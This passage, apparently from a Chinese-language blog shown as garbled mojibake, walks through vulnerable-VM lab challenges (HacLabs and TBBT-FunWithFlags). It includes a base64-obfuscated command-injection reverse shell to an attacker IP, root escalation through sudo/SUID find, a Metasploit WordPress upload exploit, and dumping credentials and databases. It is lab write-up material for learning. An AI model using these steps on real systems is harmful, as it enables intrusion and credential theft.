Network Camera (Linux 2.6.17) (94%), Netgear ReadyNAS device (RAIDiator 4.2.21 - 4.2.27) (94%), Linux 2.6.32 - 2.6.35 (94%), Linux 2.6.32 - 3.5 (94%)No exact OS matches for host (test conditions non-ideal).Uptime guess: 18.412 days (since Sun Mar 8 03:06:40 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;261 (Good luck!)IP ID Sequence Generation: All zerosService Info: OS: Linux; CPE: cpe:&#x2F;o:linux:linux_kernel Webè·¯å¾„æšä¸¾ å°è¯•çˆ†ç ´80ç«¯å£ä¸‹çš„Webè·¯å¾„ dirb http://192.168.31.196/ -w 1234---- Scanning URL: http:&#x2F;&#x2F;192.168.31.196&#x2F; ----+ http:&#x2F;&#x2F;192.168.31.196&#x2F;admin (CODE:200|SIZE:417) + http:&#x2F;&#x2F;192.168.31.196&#x2F;index.php (CODE:200|SIZE:201) + http:&#x2F;&#x2F;192.168.31.196&#x2F;server-status (CODE:403|SIZE:279) è®¿é—®/index.php æ˜¾ç¤ºFake Admin Area ä»»æ„æäº¤æŸ¥è¯¢åˆ™å›æ˜¾Fake ping executed è®¿é—®/admin æœ‰å››ä¸ªå›¾ç‰‡æ–‡ä»¶ æºä»£ç ä¸­æœ‰æç¤ºä¿¡æ¯passphrase:harder æ¼æ´åˆ©ç”¨ ä½¿ç”¨steghideå·¥å…·è¿›è¡Œåˆ†æ å‘ç°å›¾ç‰‡æ–‡ä»¶haclabs.jpegå­˜åœ¨éšå†™ 123456steghide extract -sf haclabs.jpeg -p harder wrote extracted data to &quot;imp.txt&quot;.cat imp.txt c3VwZXJhZG1pbi5waHA&#x3D;echo &quot;c3VwZXJhZG1pbi5waHA&#x3D;&quot; | base64 -d superadmin.php è®¿é—®/superadmin.php å­˜åœ¨pingåŠŸèƒ½ å°è¯•è¿›è¡Œå‘½ä»¤æ³¨å…¥ 1234567891011121314151617181920212223| cat superadmin.php&lt;?php if (isset($_POST[&#39;submitt&#39;]))&#123; $word&#x3D;array(&quot;;&quot;,&quot;&amp;&amp;&quot;,&quot;&#x2F;&quot;,&quot;bin&quot;,&quot;&amp;&quot;,&quot; &amp;&amp;&quot;,&quot;ls&quot;,&quot;nc&quot;,&quot;dir&quot;,&quot;pwd&quot;); $pinged&#x3D;$_POST[&#39;pinger&#39;]; $newStr &#x3D; str_replace($word, &quot;&quot;, $pinged); if(strcmp($pinged, $newStr) &#x3D;&#x3D; 0) &#123; $flag&#x3D;1; &#125; else &#123; $flag&#x3D;0; &#125;&#125;if ($flag&#x3D;&#x3D;1)&#123;$outer&#x3D;shell_exec(&quot;ping -c 3 $pinged&quot;);echo &quot;$outer&quot;;&#125;?&gt; æœ‰ä¸¤ç§è·å–shellçš„æ–¹æ³• ä½¿ç”¨wgetä¸‹è½½phpä¸€å¥è¯æœ¨é©¬ ä½¿ç”¨ncåå¼¹shell è¿‡æ»¤å¯ä»¥ä½¿ç”¨base64ç¼–ç è¿›è¡Œç»•è¿‡ |echo &quot;xxxx&quot;|base64 -d|bash xxxxå³ä¸ºè¦æ‰§è¡Œçš„å‘½ä»¤çš„base64ç¼–ç çš„ç»“æœ wget å†™å…¥æ–‡ä»¶å¤±è´¥ï¼Œå¯èƒ½æ²¡æœ‰æƒé™ nc ç›‘å¬ç«¯å£ 1nc -lvnp 9900 æ„é€ payload 12echo &quot;nc.traditional -e &#x2F;bin&#x2F;bash 192.168.31.10 9900&quot; | base64 bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMzEuMTAgOTkwMAo&#x3D; æ‰§è¡Œå‘½ä»¤ 1|echo &quot;bmMudHJhZGl0aW9uYWwgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMzEuMTAgOTkwMAo&#x3D;&quot;|base64 -d|bash æ¥æ”¶åˆ°åå¼¹shell æƒé™æå‡ è·å–pty 1python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; åœ¨yashçš„homeç›®å½•å‘ç°flag1 12cat &#x2F;home&#x2F;yash&#x2F;flag1.txtDue to some security issues,I have saved haclabs password in a hidden file. æœç´¢æ‹¥æœ‰è€…ä¸ºyashçš„æ–‡ä»¶/æ–‡ä»¶å¤¹ 123456789101112131415find &#x2F; -user yash 2&gt; &#x2F;dev&#x2F;null&#x2F;home&#x2F;yash&#x2F;home&#x2F;yash&#x2F;flag1.txt&#x2F;home&#x2F;yash&#x2F;.bashrc&#x2F;home&#x2F;yash&#x2F;.cache&#x2F;home&#x2F;yash&#x2F;.cache&#x2F;motd.legal-displayed&#x2F;home&#x2F;yash&#x2F;.profile&#x2F;home&#x2F;yash&#x2F;.bash_history&#x2F;home&#x2F;yash&#x2F;.gnupg&#x2F;home&#x2F;yash&#x2F;.gnupg&#x2F;private-keys-v1.d&#x2F;home&#x2F;yash&#x2F;.local&#x2F;home&#x2F;yash&#x2F;.local&#x2F;share&#x2F;home&#x2F;yash&#x2F;.local&#x2F;share&#x2F;nano&#x2F;usr&#x2F;share&#x2F;hidden&#x2F;usr&#x2F;share&#x2F;hidden&#x2F;.passwd 12cat &#x2F;usr&#x2F;share&#x2F;hidden&#x2F;.passwdhaclabs1234 åˆ‡æ¢è´¦æˆ· 12su haclabshaclabs1234 æŸ¥çœ‹sudoæƒé™ 12345678sudo -lMatching Defaults entries for haclabs on haclabs: env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\\:&#x2F;usr&#x2F;local&#x2F;bin\\:&#x2F;usr&#x2F;sbin\\:&#x2F;usr&#x2F;bin\\:&#x2F;sbin\\:&#x2F;bin\\:&#x2F;snap&#x2F;binUser haclabs may run the following commands on haclabs: (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;find å¯ä»¥ä½¿ç”¨findå‘½ä»¤è¿›è¡Œææƒ 1234567sudo -u root find &#x2F;etc&#x2F;passwd -exec passwd root \\;hackforfunhackforfunsu roothackforfunid uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root) SUID-find å…¶å®åœ¨www-dataæƒé™æ—¶å°±å¯ä»¥ä½¿ç”¨findå‘½ä»¤è¿›è¡Œæ“ä½œ æŸ¥çœ‹SUID 123find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null&#x2F;usr&#x2F;bin&#x2F;find å¯ä»¥é€šè¿‡findå‘½ä»¤æ¥è¿›è¡Œè¯»å– 12345678910111213find &#x2F;etc&#x2F;passwd -exec ls -la &#x2F;root \\;total 40drwx------ 6 root root 4096 Feb 15 16:28 .drwxr-xr-x 25 root root 4096 Mar 26 17:07 ..-rw------- 1 root root 41 Mar 26 17:22 .bash_history-rw-r--r-- 1 root root 3106 Apr 9 2018 .bashrcdrwx------ 2 root root 4096 Jan 30 06:53 .cachedrwx------ 5 root root 4096 Jan 30 03:06 .configdrwx------ 3 root root 4096 Jan 27 16:46 .gnupgdrwxr-xr-x 3 root root 4096 Jan 27 16:56 .local-rw-r--r-- 1 root root 148 Aug 17 2015 .profile-rw-r--r-- 1 root root 97 Jan 30 04:29 flag3.txt 12345678910find &#x2F;etc&#x2F;passwd -exec cat &#x2F;root&#x2F;flag3.txt \\;Congrats!!!You completed the challenege! () () \\ &#x2F; ---------- ä½†æ˜¯é€šè¿‡findæ¥å‘½ä»¤æ‰§è¡Œæ—¶å­˜åœ¨é™åˆ¶çš„ï¼Œå¹¶ä¸æ˜¯å®Œå…¨ä»¥rootè´¦æˆ·çš„èº«ä»½å»æ‰§è¡Œ åœ¨æœ¬åœ°æµ‹è¯•ä¹‹åå¾—å‡ºå¦‚ä¸‹ç»“è®º 123è¯»å–ï¼š***å†™å…¥ï¼š**2æ‰§è¡Œï¼š**4(bash); 1**, *1*, **1(exec) *** åˆ†åˆ«ä»£è¡¨æƒé™çš„ä¸‰ä½ï¼Œå…¶ä¸­*ä¸ºé€šé…ï¼Œè¡¨ç¤ºä»»æ„æƒé™ **2ï¼Œ linuxä¸­çš„æƒé™å¯ä»¥çº¿æ€§å åŠ ï¼Œ**2å³ä»£è¡¨éœ€è¦ä»…å†™æƒé™ï¼Œåœ¨**3, **6, **7çš„æƒ…å†µä¸‹ä¹Ÿæ˜¯é€‚ç”¨çš„ bashæ„ä¸ºè¯¥æ–‡ä»¶ä½œä¸ºbashçš„å‚æ•°æ¥æ‰§è¡Œ(bash run.sh)ï¼Œexecåˆ™è¡¨ç¤ºä½œä¸ºå¯æ‰§è¡Œç¨‹åºæ¥æ‰§è¡Œ(./run.sh) ç”±æ­¤çœ‹æ¥åº”å½“æ˜¯ç»§æ‰¿äº†rootçš„r-xæƒé™ï¼Œä½†æ˜¯ç›´æ¥è·å–bashåˆ™è¿˜æ˜¯ä»¥åŸç”¨æˆ·çš„èº«ä»½æ¥è·å–ï¼Œå¹¶ä¸èƒ½è·å–rootæƒé™çš„bashï¼›ä¹Ÿä¸èƒ½é€šè¿‡passwdæ¥ä¿®æ”¹rootè´¦æˆ·çš„å¯†ç (å³ä½¿euid=0) nc.traditional/nc nc.traditionalæ˜¯æœ€æ—©çš„ç‰ˆæœ¬(v1.10-41.1)ï¼Œè¯¥ç‰ˆæœ¬å…·æœ‰-eçš„é€‰é¡¹ï¼Œç”¨äºåå¼¹shellååˆ†æ–¹ä¾¿ ubuntuä¸­çš„ncå‘½ä»¤åˆ™ä¼šæŒ‡å‘netcat-openbsdï¼Œè€Œè¯¥ç‰ˆæœ¬åˆ™æ²¡æœ‰-eçš„é€‰é¡¹ï¼Œæ— æ³•ç”¨äºåå¼¹shell ncatçš„ç‰ˆæœ¬åˆ™æ¯”è¾ƒæ–°ï¼Œé›†æˆäºnmapä¸­ å‚è€ƒèµ„æ–™ exec WP nc TBBT-FunWithFlags 2020/03/31 13:24:54 é¶æœºæœªå¯ç”¨DHCPï¼Œæ•…ä½¿ç”¨äº†é»˜è®¤çš„é™æ€IP:192.168.1.105ã€‚è‹¥æœ¬æœºç½‘æ®µä¸æ˜¯192.168.1.*ï¼Œéœ€è¦åœ¨VBä¸­åˆ›å»ºä¸€ä¸ª192.168.1.*ç½‘æ®µçš„Host-Only Ethernet Adapter ç«¯å£æ‰«æ nmap -p 1-65535 -A -sV -T5 -n -v 192.168.1.105 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879Nmap scan report for 192.168.1.105Host is up (0.00047s latency).Not shown: 65531 closed portsPORT STATE SERVICE VERSION21&#x2F;tcp open ftp vsftpd 3.0.3| ftp-anon: Anonymous FTP login allowed (FTP code 230)| -rw-r--r-- 1 ftp ftp 539 Mar 04 01:11 Welcome.txt| -rw-r--r-- 1 ftp ftp 114 Mar 04 01:13 ftp_agreement.txt|_drwxr-xr-x 9 ftp ftp 4096 Mar 04 01:09 pub| ftp-syst: | STAT: | FTP server status:| Connected to ::ffff:192.168.1.3| Logged in as ftp| TYPE: ASCII| No session bandwidth limit| Session timeout in seconds is 300| Control connection is plain text| Data connections will be plain text| At session startup, client count was 1| vsFTPd 3.0.3 - secure, fast, stable|_End of status22&#x2F;tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 cf:5c:ee:76:7c:48:52:06:8d:56:07:7f:f6:5d:80:f2 (RSA)| 256 ab:bb:fa:f9:89:99:02:9e:e4:20:fa:37:4f:6f:ca:ca (ECDSA)|_ 256 ea:6d:77:f3:ff:9c:d5:dd:85:e3:1e:75:3c:7b:66:47 (ED25519)80&#x2F;tcp open http Apache httpd 2.4.18 ((Ubuntu))| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS| http-robots.txt: 4 disallowed entries |_&#x2F;howard &#x2F;web_shell.php &#x2F;backdoor &#x2F;rootflag.txt|_http-server-header: Apache&#x2F;2.4.18 (Ubuntu)|_http-title: Fun with flags!1337&#x2F;tcp open waste?| fingerprint-strings: | DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: |_ FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :SF-Port1337-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;31%Time&#x3D;5E82D546%P&#x3D;x86_64-pc-linux-gnu%r(NUSF:LL,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(GenericLineSF:s,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(GetRequest,2SF:F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(HTTPOptions,2F,SF:&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(RTSPRequest,2F,&quot;FSF:LAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(RPCCheck,2F,&quot;FLAG-sSF:heldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(DNSVersionBindReqTCP,2F,SF:&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(DNSStatusRequestTSF:CP,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(Help,2F,&quot;FLSF:AG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(SSLSessionReq,2F,&quot;FLSF:AG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(TerminalServerCookieSF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(TLSSessionReqSF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(Kerberos,2F,&quot;SF:FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(SMBProgNeg,2F,&quot;FLASF:G-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(X11Probe,2F,&quot;FLAG-sheSF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(FourOhFourRequest,2F,&quot;FLAGSF:-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(LPDString,2F,&quot;FLAG-sheSF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(LDAPSearchReq,2F,&quot;FLAG-sheSF:ldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(LDAPBindReq,2F,&quot;FLAG-sheldSF:on&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(SIPOptions,2F,&quot;FLAG-sheldon&#123;SF:cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(LANDesk-RC,2F,&quot;FLAG-sheldon&#123;cf8SF:8b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(TerminalServer,2F,&quot;FLAG-sheldon&#123;cfSF:88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(NCP,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb1SF:0c4005c1f2781a069cf8&#125;\\n&quot;)%r(NotesRPC,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c400SF:5c1f2781a069cf8&#125;\\n&quot;)%r(JavaRMI,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f27SF:81a069cf8&#125;\\n&quot;)%r(WMSRequest,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781aSF:069cf8&#125;\\n&quot;)%r(oracle-tns,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069SF:cf8&#125;\\n&quot;)%r(ms-sql-s,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\SF:n&quot;)%r(afp,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;)%r(giopSF:,2F,&quot;FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125;\\n&quot;);MAC Address: 08:00:27:F7:18:EC (Oracle VirtualBox virtual NIC)Device type: general purposeRunning: Linux 3.X|4.XOS CPE: cpe:&#x2F;o:linux:linux_kernel:3 cpe:&#x2F;o:linux:linux_kernel:4OS details: Linux 3.2 - 4.9Uptime guess: 0.012 days (since Tue Mar 31 01:13:02 2020)Network Distance: 1 hopTCP Sequence Prediction: Difficulty&#x3D;262 (Good luck!)IP ID Sequence Generation: All zerosService Info: OSs: Unix, Linux; CPE: cpe:&#x2F;o:linux:linux_kernel nmapåœ¨æ‰«æç»“æœä¸­å°±ç»™å‡ºäº†FLAG-sheldon å®é™…ä¸Šä½¿ç”¨ncå°±èƒ½è·å¾—flag 123nc 192.168.1.105 1337FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125; FLAG-sheldon&#123;cf88b37e8cb10c4005c1f2781a069cf8&#125; nmapåœ¨æ‰«ææ—¶ç»™å‡ºäº†80ç«¯å£ä¸Šrobots.txtçš„ç›¸å…³ä¿¡æ¯ 12http-robots.txt: 4 disallowed entries |_&#x2F;howard &#x2F;web_shell.php &#x2F;backdoor &#x2F;rootflag.txt æµ‹è¯•ä¹‹åå‘ç°åªæœ‰/howardå¯ä»¥è®¿é—® Webè·¯å¾„æšä¸¾ å°è¯•çˆ†ç ´80ç«¯å£ä¸‹çš„Webè·¯å¾„ dirb http://192.168.1.105/ -w 12345678910---- Scanning URL: http:&#x2F;&#x2F;192.168.1.105&#x2F; ----+ http:&#x2F;&#x2F;192.168.1.105&#x2F;index.html (CODE:200|SIZE:239) &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;javascript&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;phpmyadmin&#x2F; &#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;private&#x2F; + http:&#x2F;&#x2F;192.168.1.105&#x2F;robots.txt (CODE:200|SIZE:112) + http:&#x2F;&#x2F;192.168.1.105&#x2F;server-status (CODE:403|SIZE:301)&#x3D;&#x3D;&gt; DIRECTORY: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F; å¯ä»¥çœ‹åˆ°å­˜åœ¨phpmyadminæ¡†æ¶å’Œwordpressæ¡†æ¶ è®¿é—®/privateï¼Œçœ‹èµ·æ¥åƒæ˜¯ä¸€ä¸ªè‡ªå»ºçš„ç«™ç‚¹ å°è¯•åå‘ç°/private/login.phpï¼Œå¯ä»¥å°è¯•SQLæ³¨å…¥æˆ–è€…æ”¶é›†ä¿¡æ¯å†è¿›è¡Œç™»å…¥çˆ†ç ´ è®¿é—®/howard /howard/stolen_data/pennys_lastname.txtä¸­è®°å½•å†…å®¹ä¸ºERROR 404 ##0x02 å¨èƒå»ºæ¨¡## 21ç«¯å£ä¸Šçš„FTPå…è®¸anonymousè´¦æˆ·ç™»å…¥ï¼Œå¯èƒ½èƒ½å¤Ÿè·å–ä¸€äº›æ•æ„Ÿä¿¡æ¯ éœ€è¦å…ˆæ”¶é›†ä¸€å®šçš„ä¿¡æ¯æ‰èƒ½å¯¹SSHæœåŠ¡è¿›è¡Œç™»å½•çˆ†ç ´ 80ç«¯å£ä¸Šçš„å­˜åœ¨/private, /music/wordpress, /phpmyadminè¿™ä¸‰ä¸ªç«™ç‚¹ï¼Œå…¶ä¸­/private/login.phpä¸ºç™»å…¥å¤„ï¼Œå¯ä»¥è€ƒè™‘SQLæ³¨å…¥æ¼æ´æŒ–æ˜æˆ–è€…å¯†ç çˆ†ç ´ï¼Œ/music/wordpresså¯ä»¥ç”¨wpscanè¿›è¡Œæ·±å…¥ä¿¡æ¯æ”¶é›† æ¼æ´åˆ©ç”¨ ä½¿ç”¨wpscanå¯¹wordpressç«™ç‚¹è¿›è¡Œæ‰«æ wpscan --url http://192.168.1.105/music/wordpress -e u 123456789101112131415161718[i] User(s) Identified:[+] footprintsonthemoon | Found By: Author Posts - Author Pattern (Passive Detection) | Confirmed By: | Rss Generator (Passive Detection) | Wp Json Api (Aggressive Detection) | - http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;index.php&#x2F;wp-json&#x2F;wp&#x2F;v2&#x2F;users&#x2F;?per_page&#x3D;100&amp;page&#x3D;1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection)[+] kripke | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection)[+] stuart | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) å¾—åˆ°ä¸‰ä¸ªè´¦æˆ·çš„ç”¨æˆ·å 123456789101112wpscan --url http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress -e ap[+] reflex-gallery | Location: http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;reflex-gallery&#x2F; | Last Updated: 2019-05-10T16:05:00.000Z | [!] The version is out of date, the latest version is 3.1.7 | | Found By: Urls In Homepage (Passive Detection) | | Version: 3.1.3 (80% confidence) | Found By: Readme - Stable Tag (Aggressive Detection) | - http:&#x2F;&#x2F;192.168.1.105&#x2F;music&#x2F;wordpress&#x2F;wp-content&#x2F;plugins&#x2F;reflex-gallery&#x2F;readme.txt å¾—åˆ°æ’ä»¶ä¿¡æ¯ æœç´¢æ’ä»¶ç›¸å…³ä¿¡æ¯ 12345678910searchsploit reflex gallery--------------------------------------------------------------------- ---------------------------------------- Exploit Title | Path | (&#x2F;usr&#x2F;share&#x2F;exploitdb&#x2F;)--------------------------------------------------------------------- ----------------------------------------WordPress Plugin Reflex Gallery - Arbitrary File Upload (Metasploit) | exploits&#x2F;php&#x2F;remote&#x2F;36809.rbWordPress Plugin Reflex Gallery 3.1.3 - Arbitrary File Upload | exploits&#x2F;php&#x2F;webapps&#x2F;36374.txt--------------------------------------------------------------------- ----------------------------------------Shellcodes: No Result åœ¨MSFä¸­æœç´¢ç›¸å…³EXP 12345678search reflexMatching Modules&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D; # Name Disclosure Date Rank Check Description - ---- --------------- ---- ----- ----------- 0 exploit&#x2F;unix&#x2F;webapp&#x2F;wp_reflexgallery_file_upload 2012-12-30 excellent Yes Wordpress Reflex Gallery Upload Vulnerability ä½¿ç”¨EXP 1234use exploit&#x2F;unix&#x2F;webapp&#x2F;wp_reflexgallery_file_uploadset RHOSTS 192.168.1.105set TARGETURI &#x2F;music&#x2F;wordpressrun æˆåŠŸè·å–Shell æƒé™æå‡ FLAG-raz è·å–tty 12shellpython -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; æŸ¥çœ‹wordpressçš„æ•°æ®åº“é…ç½®æ–‡ä»¶ 12345678cat &#x2F;var&#x2F;www&#x2F;html&#x2F;music&#x2F;wordpress&#x2F;wp-config.php | grep -i dbdefine( &#39;DB_NAME&#39;, &#39;footprintsonthemoon&#39; );define( &#39;DB_USER&#39;, &#39;footprintsonthemoon&#39; );define( &#39;DB_PASSWORD&#39;, &#39;footprintsonthemoon1337&#39; );define( &#39;DB_HOST&#39;, &#39;localhost&#39; );define( &#39;DB_CHARSET&#39;, &#39;utf8mb4&#39; );define( &#39;DB_COLLATE&#39;, &#39;&#39; ); è¿æ¥æ•°æ®åº“ mysql -h localhost -u footprintsonthemoon -pfootprintsonthemoon1337 footprintsonthemoon æŸ¥çœ‹æ•°æ®åº“ 12345678show databases;+---------------------+| Database |+---------------------+| information_schema || footprintsonthemoon |+---------------------+2 rows in set (0.00 sec) é€€å‡ºmysqlå¹¶å¯¼å‡ºæ•°æ®åº“ 12exitmysqldump -h localhost -u footprintsonthemoon -pfootprintsonthemoon1337 --databases footprintsonthemoon &gt; &#x2F;var&#x2F;www&#x2F;html&#x2F;dump.sql åœ¨Kaliä¸­ä¸‹è½½å¤‡ä»½ 1curl -O http:&#x2F;&#x2F;192.168.1.105&#x2F;dump.sql æŸ¥æ‰¾flag 123cat dump.sql | grep &quot;FLAG&quot; --color&#x3D;autoFLAG-raz&#123;40d17a74e28a62eac2df19e206f0987c&#125; è¿™é‡Œå¯¼å‡ºçš„æ•°æ®åœ¨Kaliä¸­ç”¨grepèŠ‚é€‰æ—¶å¦‚æœæ²¡æœ‰ç”¨é«˜äº®å°±å¾ˆéš¾æ‰¾ FLAG-bernadette æŸ¥çœ‹/privateç«™ç‚¹çš„æ•°æ®åº“é…ç½®æ–‡ä»¶ 12345cat &#x2F;var&#x2F;www&#x2F;html&#x2F;private&#x2F;db_config.php | grep -i db$DBUSER &#x3D; &#39;bigpharmacorp&#39;;$DBPASS &#x3D; &#39;weareevil&#39;;$con&#x3D;mysqli_connect(&quot;127.0.0.1&quot;,$DBUSER,$DBPASS,&quot;bigpharmacorp&quot;); è¿æ¥æ•°æ®åº“ mysql -h localhost -u bigpharmacorp -pweareevil æŸ¥æ‰¾flag 1234567891011121314151617181920212223242526272829303132show databases;+--------------------+| Database |+--------------------+| information_schema || bigpharmacorp |+--------------------+2 rows in set (0.00 sec)use bigpharmacorpï¼›show tables;+-------------------------+| Tables_in_bigpharmacorp |+-------------------------+| products || users |+-------------------------+2 rows in set (0.00 sec)select * from users;+----+------------+----------------------------------+------------+---------------------------------------------------+| id | username | password | fname | description |+----+------------+----------------------------------+------------+---------------------------------------------------+| 1 | admin | 3fc0a7acf087f549ac2b266baf94b8b1 | josh | Dont mess with me || 2 | bobby | 8cb1fb4a98b9c43b7ef208d624718778 | bob | I like playing football. || 3 | penny69 | cafa13076bb64e7f8bd480060f6b2332 | penny | Hi I am Penny I am new here!! &lt;3 || 4 | mitsos1981 | 05d51709b81b7e0f1a9b6b4b8273b217 | dimitris | Opa re malaka! || 5 | alicelove | e146ec4ce165061919f887b70f49bf4b | alice | Eat Pray Love || 6 | bernadette | dc5ab2b32d9d78045215922409541ed7 | bernadette | FLAG-bernadette&#123;f42d950ab0e966198b66a5c719832d5f&#125; |+----+------------+----------------------------------+------------+---------------------------------------------------+6 rows in set (0.00 sec) FLAG-bernadette&#123;f42d950ab0e966198b66a5c719832d5f&#125; FLAG-amy æ”¶é›†ä¿¡æ¯ 123456789101112ls -l &#x2F;home&#x2F;amy&#x2F;total 12-rwxrwxrwx 1 amy amy 434 Mar 4 16:30 notes.txt-rwxr-xr-x 1 amy amy 7488 Mar 6 00:06 secretdiarycat &#x2F;home&#x2F;amy&#x2F;notes.txtThis is my secret diary.The safest way to keep my secrets is inside a compiled executable program.As soon as I get popular now, that I have friends, I will start adding my secrets here.I have used a really strong password that it cant be bruteforced.Seriously it is 18 digit, alphanumeric, uppercase&#x2F;lowercase with symbols.And since my program is already compiled, no one can read the source code in order to view the password! å¯ä»¥åˆ¤æ–­/home/amy/secretdiaryæ˜¯ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åº ä½¿ç”¨stringså‘½ä»¤æŸ¥çœ‹ 123456strings secretdiaryP@SSw0rd123Sh3ld0nLogin Success!Soon I will be adding my secrets here..FLAG-amy&#123;60263777358690b90e8dbe8fea6943c9&#125; FLAG-amy&#123;60263777358690b90e8dbe8fea6943c9&#125; FLAG-penny æ”¶é›†ä¿¡æ¯ 1234567891011121314ls -la &#x2F;home&#x2F;pennytotal 36drwxr-xr-x 4 penny penny 4096 Mar 6 00:37 .drwxr-xr-x 10 root root 4096 Mar 4 02:33 ..-rw-rw-r-- 1 penny penny 61 Mar 5 00:26 .FLAG.penny.txt-rw------- 1 penny penny 57 Mar 6 00:47 .bash_history-rw-r--r-- 1 penny penny 220 Sep 1 2015 .bash_logout-rw-r--r-- 1 penny penny 3771 Sep 1 2015 .bashrcdrwx------ 2 penny penny 4096 Mar 6 00:37 .cachedrwxrwxr-x 2 penny penny 4096 Mar 5 00:26 .nano-rw-r--r-- 1 penny penny 655 May 16 2017 .profilecat &#x2F;home&#x2F;penny&#x2F;.FLAG.penny.txtRkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0&#x3D; base64 decode 12echo &quot;RkxBRy1wZW5ueXtkYWNlNTJiZGIyYTBiM2Y4OTlkZmIzNDIzYTk5MmIyNX0&#x3D;&quot; | base64 -dFLAG-penny&#123;dace52bdb2a0b3f899dfb3423a992b25&#125; FLAG-penny&#123;dace52bdb2a0b3f899dfb3423a992b25&#125; FLAG-howard å°†FTPæ ¹ç›®å½•æ‰“åŒ… 1zip -r 